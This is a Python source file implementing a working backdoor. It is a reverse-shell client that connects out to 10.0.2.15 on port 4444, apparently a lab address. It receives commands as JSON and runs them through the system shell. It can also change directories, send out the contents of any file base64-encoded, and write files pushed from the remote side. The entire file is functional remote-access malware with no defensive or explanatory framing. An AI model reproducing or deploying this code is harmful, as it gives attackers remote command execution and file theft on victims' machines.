#!/usr/bin/python

import socket
import subprocess
import json
import sys
import os
import base64


class Backdoor(object):
    """docstring for Backdoor"""

    def __init__(self, ip, port):
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((ip, port))
        except Exception as e:
            print("[-] Could not establish connection due to " + str(e))
            sys.exit()

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())  # Encoding with base64 due to encoding error

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # Using base64 due to encoding error

        return "[+] Upload successful.."

    def run(self):
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit("[+] Received exit command")

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])

                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error while handling command"

            self.reliable_send(command_result)


my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()